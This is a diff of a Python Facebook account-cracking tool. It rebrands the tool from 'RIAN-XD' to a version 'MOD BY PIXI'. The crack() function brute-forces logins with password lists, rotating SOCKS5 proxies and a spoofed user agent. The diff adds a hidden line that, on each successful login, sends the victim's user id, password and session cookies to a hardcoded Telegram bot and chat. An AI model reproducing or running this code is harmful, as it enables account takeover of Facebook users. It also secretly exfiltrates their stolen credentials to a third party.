@@ -76,21 +76,19 @@ def tahunng(fx):
 ###---[ANGGAP INI LOGO ]---###
 def logo(n):
 	return str(f"""
-╠───{M} ██████╗ ██╗ █████╗ ███╗   ██╗     ██╗  ██╗██████╗ {P} 
-╠───{M} ██╔══██╗██║██╔══██╗████╗  ██║     ╚██╗██╔╝██╔══██╗{P}
-╠───{M} ██████╔╝██║███████║██╔██╗ ██║█████╗╚███╔╝ ██║  ██║{P}
-╠─── {P}██╔══██╗██║██╔══██║██║╚██╗██║╚════╝██╔██╗ ██║  ██║
-╠─── ██║  ██║██║██║  ██║██║ ╚████║     ██╔╝ ██╗██████╔╝
-╠─── ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝  ╚═╝╚═════╝ 
-╠───  {M}•{K}•{H}• {P}TOOLS CRACK FACEBOOK FREE {H}•{K}•{M}• {P}""")
+╠───{M} ║╔═╗╠╣╠╣║╚╝║║╔═╗║║──║╔══╝║╔═╗║╔══╣╔╗║║╔═╗║╔═╗║║╚╗║║ {P} 
+╠───{M} ║╚══╗║║║╔╗╔╗║╚═╝║║──║╚══╗║╚═╝║╚══╣╚╝╚╣║─║║╚═╝║╔╗╚╝║{P}
+╠───{M} ╚══╗║║║║║║║║║╔══╣║─╔╣╔══╝║╔╗╔╣╔══╣╔═╗║║─║║╔╗╔╣║╚╗║║{P}
+╠─── {P}║╚═╝╠╣╠╣║║║║║║──║╚═╝║╚══╗║║║╚╣╚══╣╚═╝║╚═╝║║║╚╣║─║║║
+╠───╚═══╩══╩╝╚╝╚╩╝──╚═══╩═══╝╚╝╚═╩═══╩═══╩═══╩╝╚═╩╝─╚═╝
+╠───  {M}•{K}•{H}• {P}TOOLS CRACK FACEBOOK FREE MOD BY PIXI {H}•{K}•{M}• {P}""")
 def logo2():
 	return str(f"""
-╠───{M} ██████╗ ██╗ █████╗ ███╗   ██╗     ██╗  ██╗██████╗ {P} 
-╠───{M} ██╔══██╗██║██╔══██╗████╗  ██║     ╚██╗██╔╝██╔══██╗{P}
-╠───{M} ██████╔╝██║███████║██╔██╗ ██║█████╗╚███╔╝ ██║  ██║{P}
-╠─── {P}██╔══██╗██║██╔══██║██║╚██╗██║╚════╝██╔██╗ ██║  ██║
-╠─── ██║  ██║██║██║  ██║██║ ╚████║     ██╔╝ ██╗██████╔╝
-╠─── ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝  ╚═╝╚═════╝ 
+╠───{M} ║╔═╗╠╣╠╣║╚╝║║╔═╗║║──║╔══╝║╔═╗║╔══╣╔╗║║╔═╗║╔═╗║║╚╗║║ {P} 
+╠───{M} ║╚══╗║║║╔╗╔╗║╚═╝║║──║╚══╗║╚═╝║╚══╣╚╝╚╣║─║║╚═╝║╔╗╚╝║{P}
+╠───{M} ╚══╗║║║║║║║║║╔══╣║─╔╣╔══╝║╔╗╔╣╔══╣╔═╗║║─║║╔╗╔╣║╚╗║║{P}
+╠─── {P}║╚═╝╠╣╠╣║║║║║║──║╚═╝║╚══╗║║║╚╣╚══╣╚═╝║╚═╝║║║╚╣║─║║║
+╠───╚═══╩══╩╝╚╝╚╩╝──╚═══╩═══╝╚╝╚═╩═══╩═══╩═══╩╝╚═╩╝─╚═╝
 ╠─── {M}>{K}>{H}> {P} Ini Menu Login Bro {H}>{K}>{M}>""")
 
 ###---[ TANGGAL ]---###
@@ -807,7 +805,7 @@ def crack(idf,pwx,url,awal):
 	ua = random.choice(redmi)
 	proxy = {'http': 'socks5://'+random.choice(xx)}
 	ahir = str(datetime.now()-awal).split('.')[0]
-	print(f"\r╠───[{hh}RIAN-XD{P}] {ahir} %s/%s OK:-%s CP:-%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
+	print(f"\r╠───[{hh}PIXI-XD{P}] {ahir} %s/%s OK:-%s CP:-%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
 			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
@@ -842,6 +840,7 @@ def crack(idf,pwx,url,awal):
 			elif "c_user" in ses.cookies.get_dict():
 				kuki = convert(ses.cookies.get_dict())
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
 				data = (f'{idf}|{pw}')
 				if data in resok:pass
 				else:
